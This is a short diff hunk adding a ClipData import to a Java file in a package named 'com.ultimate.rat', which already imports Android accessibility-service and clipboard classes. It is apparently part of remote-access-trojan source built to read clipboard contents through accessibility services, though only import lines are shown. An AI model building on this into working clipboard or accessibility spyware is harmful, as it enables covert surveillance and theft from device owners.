@@ -2,6 +2,7 @@ package com.ultimate.rat;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.view.accessibility.AccessibilityEvent;
